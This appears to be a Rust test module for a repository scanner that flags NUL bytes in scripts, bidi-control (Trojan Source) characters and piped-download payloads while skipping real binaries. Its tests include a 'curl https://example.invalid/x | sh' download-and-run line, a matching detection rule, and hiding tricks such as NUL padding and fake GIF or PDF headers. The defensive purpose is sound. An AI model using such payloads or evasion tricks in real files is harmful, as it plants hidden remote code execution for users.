        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, limits);

        assert!(report.truncated);
        assert!(explanations(&report)[0].1.contains("truncated=true"));
    }

    #[test]
    fn file_rule_explanations_are_cleaned_and_long_lists_are_capped() {
        fn noisy(_: &FileCtx<'_>) -> Vec<Hit> {
            (1..=150)
                .map(|line| Hit {
                    line,
                    severity: Severity::High,
                    reason: "bad \u{1b}[2J text".to_string(),
                })
                .collect()
        }
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.pth", b"x");
        let rules = [file_rule("**/*.pth", noisy)];

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.findings.len(), MAX_FINDINGS_PER_FILE_CHECK);
        assert!(
            report
                .findings
                .iter()
                .all(|f| !f.explanation.contains('\u{1b}'))
        );
        let last = report.findings.last().unwrap();
        assert!(last.explanation.contains("50 more"), "{}", last.explanation);
    }

    // ---- scripts with NUL bytes -------------------------------------------

    use crate::rule::builtin_rules;

    const NUL_RULE: &str = "deception.nul-byte-in-script";
    const BIDI: &str = "\u{202e}";

    fn builtin_findings(report: &Report, rule_id: &str) -> Vec<(String, usize)> {
        report
            .findings
            .iter()
            .filter(|f| f.rule_id == rule_id)
            .map(|f| (to_slash(&f.file), f.line))
            .collect()
    }

    #[test]
    fn a_shell_script_with_a_nul_in_a_comment_still_reaches_the_line_rules() {
        let dir = tempfile::tempdir().unwrap();
        // The NUL is on line 1; a Trojan Source character sits on line 2.
        write(
            dir.path(),
            "install.sh",
            format!("# a\0b\necho {BIDI}\n").as_bytes(),
        );
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("install.sh".to_string(), 1)]
        );
        assert_eq!(
            builtin_findings(&report, "deception.bidi-control"),
            [("install.sh".to_string(), 2)],
            "the line rules must see what follows the NUL byte"
        );
        assert!(report.skipped.is_empty(), "{:?}", report.skipped);
        assert!(report.is_complete());
        assert_eq!(report.files_scanned, 1);
    }

    #[test]
    fn a_file_with_a_shebang_and_no_extension_is_a_script() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "configure", b"#!/bin/sh\n# x\0y\n");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("configure".to_string(), 2)]
        );
        assert!(report.skipped.is_empty());
    }

    #[test]
    fn a_nul_byte_far_from_the_start_of_a_script_is_still_reported() {
        let dir = tempfile::tempdir().unwrap();
        // Past the 8 KiB window used to sniff for binaries.
        let content = format!("{}\0\n", "echo hi\n".repeat(5000));
        write(dir.path(), "late.sh", content.as_bytes());
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("late.sh".to_string(), 5001)]
        );
    }

    #[test]
    fn extensions_are_matched_without_regard_to_case() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "RUN.SH", b"# a\0b\n");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("RUN.SH".to_string(), 1)]
        );
    }

    #[test]
    fn files_with_a_known_binary_header_stay_binary() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "image.png", b"\x89PNG\0\0");
        write(dir.path(), "data.gz", &[0x1F, 0x8B, 8, 0, 0]);
        write(dir.path(), "module.wasm", b"\0asm\x01\0\0\0");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(builtin_findings(&report, NUL_RULE).is_empty());
        assert_eq!(report.skipped.len(), 3);
        assert!(
            report
                .skipped
                .iter()
                .all(|s| s.reason == SkipReason::Binary)
        );
        // Read, listed, and no rules for the format: that does not make the
        // scan inconclusive (an executable binary would).
        assert!(report.is_complete());
    }

    #[test]
    fn a_utf16_script_is_decoded_and_read_by_the_line_rules() {
        let dir = tempfile::tempdir().unwrap();
        let utf16 = |text: &str, le: bool| {
            let mut bytes = if le {
                vec![0xFF, 0xFE]
            } else {
                vec![0xFE, 0xFF]
            };
            for unit in text.encode_utf16() {
                bytes.extend(if le {
                    unit.to_le_bytes()
                } else {
                    unit.to_be_bytes()
                });
            }
            bytes
        };
        write(dir.path(), "legit.ps1", &utf16("Write-Host", true));
        write(
            dir.path(),
            "bidi.ps1",
            &utf16("# a\n# \u{202E}evil\n", true),
        );
        write(dir.path(), "bidi-be.vbs", &utf16("' \u{202E}evil\n", false));
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(builtin_findings(&report, NUL_RULE).is_empty());
        assert!(report.skipped.is_empty());
        let bidi: Vec<_> = report
            .findings
            .iter()
            .map(|f| (to_slash(&f.file), f.line))
            .collect();
        assert_eq!(
            bidi,
            [("bidi-be.vbs".to_string(), 1), ("bidi.ps1".to_string(), 2)]
        );
    }

    #[test]
    fn a_file_with_a_nul_and_no_known_header_still_reaches_the_line_rules() {
        let dir = tempfile::tempdir().unwrap();
        // Sourced by install.sh; dash drops the NUL and runs the rest.
        write(dir.path(), "lib/common", b"# x\n\0\n# \xE2\x80\xAEevil\n");
        write(dir.path(), ".envrc", b"a\0\n# \xE2\x80\xAEevil\n");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let lines: Vec<_> = report
            .findings
            .iter()
            .map(|f| (to_slash(&f.file), f.line))
            .collect();
        assert_eq!(
            lines,
            [(".envrc".to_string(), 2), ("lib/common".to_string(), 3)]
        );
        assert!(report.skipped.is_empty());
    }

    /// Bytes that are not valid UTF-8 (0xFF never is) around a sequence the
    /// bidi rule would match, with a few NULs, like the middle of an icon or
    /// an audio stream.
    fn noise_with_bidi(header: &[u8]) -> Vec<u8> {
        let mut bytes = header.to_vec();
        for i in 0..400u32 {
            bytes.push((i.wrapping_mul(37) % 251) as u8 | 0x80);
        }
        bytes.extend_from_slice(&[0xFF, 0xE2, 0x80, 0xAE, 0xFF]);
        bytes.extend_from_slice(&[0x11; 200]);
        bytes
    }

    #[test]
    fn binary_data_without_a_known_header_gets_no_findings_from_non_ascii_rules() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "icon.icns", &noise_with_bidi(b"icns\0\0\x10\0"));
        write(
            dir.path(),
            "voice.mp3",
            &noise_with_bidi(b"ID3\x03\0\0\0\0\x0a\0"),
        );
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(report.findings.is_empty(), "{:?}", report.findings);
        assert!(report.is_complete());
    }

    #[test]
    fn a_script_is_read_even_when_the_rest_of_it_is_binary() {
        // Scripts keep the rule that a NUL does not make them binary: the
        // zipapp pattern (see the NUL rule) and the NUL itself are reported.
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "tool.sh",
            &noise_with_bidi(b"#!/bin/sh\n# a\0b\n"),
        );
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("tool.sh".to_string(), 2)]
        );
        assert!(report.skipped.is_empty());
    }

    const CURL_SH: &str = r#"
        [[rule]]
        id = "test.curl-sh"
        engine = "line-regex"
        family = "test"
        stage = "run"
        severity = "high"
        description = "Pipes a download into a shell"
        example = "lib/env:1"
        pattern = 'curl .*\| *sh'
    "#;

    const PAYLOAD: &[u8] = b"curl https://example.invalid/x | sh\n";

    fn payload_with(prefix: &[u8], suffix: &[u8]) -> Vec<u8> {
        [prefix, PAYLOAD, suffix].concat()
    }

    /// Scans one extensionless file (a shell can `source` it) with the
    /// builtin rules and the curl rule, and returns the report.
    fn scan_sourced(contents: &[u8]) -> Report {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "lib/env", contents);
        let mut rules = builtin_rules().unwrap();
        rules.extend(parse_rules(CURL_SH, "test.toml").unwrap());
        scan(dir.path(), &rules, Limits::default())
    }

    fn assert_payload_found_on_line(report: &Report, line: usize) {
        let found: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "test.curl-sh")
            .collect();
        assert_eq!(found.len(), 1, "{:?}", report.findings);
        assert_eq!(found[0].line, line);
        assert!(
            report
                .skipped
                .iter()
                .all(|s| s.reason == SkipReason::Binary)
        );
        assert!(report.is_complete());
    }

    #[test]
    fn one_nul_and_one_invalid_byte_do_not_hide_a_sourced_payload() {
        let report = scan_sourced(&payload_with(b"", b"# \0\xFF\n"));

        assert_payload_found_on_line(&report, 1);
        assert!(
            report.findings[0]
                .explanation
                .ends_with("(found in a binary-looking file)"),
            "{}",
            report.findings[0].explanation
        );
    }

    #[test]
    fn a_nul_past_the_sniffed_prefix_does_not_hide_a_payload() {
        let comments = "# a comment line\n".repeat(600);
        assert!(comments.len() > BINARY_SNIFF_LEN);
        let report = scan_sourced(&payload_with(comments.as_bytes(), b"# \0\xFF\n"));

        assert_payload_found_on_line(&report, 601);
    }

    #[test]
    fn nul_padding_after_a_payload_does_not_hide_it() {
        let report = scan_sourced(&payload_with(b"", &[0; 4096]));

        assert_payload_found_on_line(&report, 1);
    }

    #[test]
    fn nul_between_every_byte_does_not_hide_a_payload() {
        // ASCII in UTF-16 without a byte order mark: one NUL per byte.
        let wide: Vec<u8> = PAYLOAD.iter().flat_map(|&b| [b, 0]).collect();
        let report = scan_sourced(&wide);

        assert_payload_found_on_line(&report, 1);
    }

    #[test]
    fn a_latin_1_byte_with_a_nul_does_not_hide_a_payload() {
        let report = scan_sourced(&payload_with(b"", b"# caf\xE9 \0\n"));

        assert_payload_found_on_line(&report, 1);
    }

    #[test]
    fn text_with_a_stray_nul_is_not_marked_binary_looking() {
        let report = scan_sourced(&payload_with(b"# a stray \0 in plain text\n", b""));

        assert_payload_found_on_line(&report, 2);
        assert!(!report.findings[0].explanation.contains("binary-looking"));
        assert!(report.skipped.is_empty());
    }

    #[test]
    fn a_known_header_does_not_hide_a_sourced_payload() {
        // `GIF89a=1` is a valid shell assignment; the rest of the file runs.
        for header in [&b"GIF89a=1\n"[..], b"%PDF-1.4\n", b"PK\x03\x04\n"] {
            let report = scan_sourced(&payload_with(header, b"\0\n"));

            assert_payload_found_on_line(&report, 2);
            assert!(
                report.findings[0]
                    .explanation
                    .ends_with("(found in a binary-looking file)")
            );
            assert!(report.is_complete());
        }
    }

    #[test]
    fn real_binary_formats_give_no_findings() {
        let dir = tempfile::tempdir().unwrap();
        let formats: [(&str, &[u8]); 5] = [
            ("a.png", b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR"),
            ("b.zip", b"PK\x03\x04\x14\0\0\0\x08\0"),
            ("c.gz", &[0x1F, 0x8B, 8, 0, 0, 0, 0, 0]),
            ("d.icns", b"icns\0\0\x10\0"),
            ("e.mp3", b"ID3\x03\0\0\0\0\x0a\0"),
        ];
        for (name, header) in formats {
            write(dir.path(), name, &noise_with_bidi(header));
        }
        let mut rules = builtin_rules().unwrap();
        rules.extend(parse_rules(CURL_SH, "test.toml").unwrap());

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(report.findings.is_empty(), "{:?}", report.findings);
        assert_eq!(report.skipped.len(), 5);
        assert!(report.is_complete());
    }

    #[test]
    fn a_flood_of_low_findings_cannot_hide_a_critical_one() {
        const DECOY_AND_PAYLOAD: &str = r#"
            [[rule]]
            id = "test.decoy"
            engine = "line-regex"
            family = "test"
            stage = "run"
            severity = "low"
            description = "Decoy"
            example = "a:1"
            pattern = 'DECOY'

            [[rule]]
            id = "test.payload"
            engine = "line-regex"
            family = "test"
            stage = "run"
            severity = "critical"
            description = "Payload"
            example = "a:1"
            pattern = 'PAYLOAD'
        "#;
        let dir = tempfile::tempdir().unwrap();
        let mut contents = "DECOY\n".repeat(150);
        contents.push_str("PAYLOAD\n");
        write(dir.path(), "x.txt", contents.as_bytes());
        let rules = parse_rules(DECOY_AND_PAYLOAD, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let critical: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.severity == Severity::Critical)
            .map(|f| f.line)
            .collect();
        assert_eq!(critical, [151]);
        assert_eq!(
            report.unlisted,
            [Unlisted {
                file: PathBuf::from("x.txt"),
                rule_id: "test.decoy".to_string(),
                severity: Severity::Low,
                count: 50,
            }]
        );
    }

    #[test]
    fn a_character_cut_by_a_nul_is_whole_for_the_line_rules() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "notes",
            b"some notes x \xE2\0\x80\xAE y and more text\n",
        );
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, "deception.bidi-control"),
            [("notes".to_string(), 1)]
        );
    }

    #[test]
    fn a_line_rule_lists_a_limited_number_of_findings_per_file_and_counts_the_rest() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "todo.txt", "TODO\n".repeat(130).as_bytes());
        write(dir.path(), "few.txt", "TODO\n".repeat(3).as_bytes());
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let in_file = |name: &str| {
            report
                .findings
                .iter()
                .filter(|f| to_slash(&f.file) == name)
                .count()
        };
        assert_eq!(in_file("todo.txt"), MAX_LINE_FINDINGS_PER_RULE);
        assert_eq!(in_file("few.txt"), 3);
        assert_eq!(
            report.unlisted,
            [Unlisted {
                file: PathBuf::from("todo.txt"),
                rule_id: "test.everywhere".to_string(),
                severity: Severity::Low,
                count: 30,
            }]
        );
    }

    #[test]
    fn nul_ratio_and_utf8_checks() {
        assert!(nul_file_is_text(b"a stray \0 in some text"));
        assert!(nul_file_is_text("h\0\u{e9}llo \u{202e} world\n".as_bytes()));
        // A multi-byte character split by a NUL is whole again once it is gone.
        assert!(nul_file_is_text(
            b"some text \xE2\0\x80\xAE here and there\0"
        ));
        assert!(!nul_file_is_text(b"some text \0 and \xFF"));
        assert!(!nul_file_is_text(b"some text \0 and \xE2\x80"), "cut-off");
        assert!(!nul_file_is_text(&[0; 64]));
        // The limit is one NUL in eight bytes.
        assert!(nul_file_is_text(b"abcdefg\0"));
        assert!(!nul_file_is_text(b"abcdef\0\0"));

        // Feeding in pieces gives the same answer as feeding all at once.
        let data = "h\u{e9}\0llo \u{202e}\0 and more text \n".as_bytes();
        for first in 0..data.len() {
            for second in first..data.len() {
                let mut probe = NulProbe::default();
                probe.feed(&data[..first]);
                probe.feed(&data[first..second]);
                probe.feed(&data[second..]);
                assert!(probe.is_text(), "cuts at {first} and {second}");
            }
        }
    }

    #[test]
    fn an_elf_named_like_a_script_is_an_executable_not_a_script() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "tool.sh", b"\x7fELF\x02\x01\x01\0\0\0\0\0");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.inconclusive_count(), 1);
        assert!(builtin_findings(&report, NUL_RULE).is_empty());
    }

    #[test]
    fn script_detection_and_nul_line_helpers() {
        assert!(is_script("a/b/run.sh", b""));
        assert!(is_script("a/RUN.PS1", b""));
        assert!(is_script("tool", b"#!/usr/bin/env node\n"));
        assert!(!is_script("a.txt", b"hello"));
        assert!(!is_script("archive.sh.zip", b"PK"));
        assert!(!is_script("x.ps1", &[0xFF, 0xFE, b'a', 0]));
        assert!(has_script_extension("x.ps1"));
        assert_eq!(decode_utf16_bom(&[0xFF, 0xFE, b'a', 0, b'b', 0]), "ab");
        assert_eq!(decode_utf16_bom(&[0xFE, 0xFF, 0, b'a', 0xD8]), "a\u{FFFD}");
        assert!(!is_script("noext", b"plain"));

        assert_eq!(first_nul_line(b"a\nb\0c"), Some(2));
        assert_eq!(first_nul_line(b"a\r\nb\r\n\0"), Some(3));
        assert_eq!(first_nul_line(b"no nul"), None);
    }
}
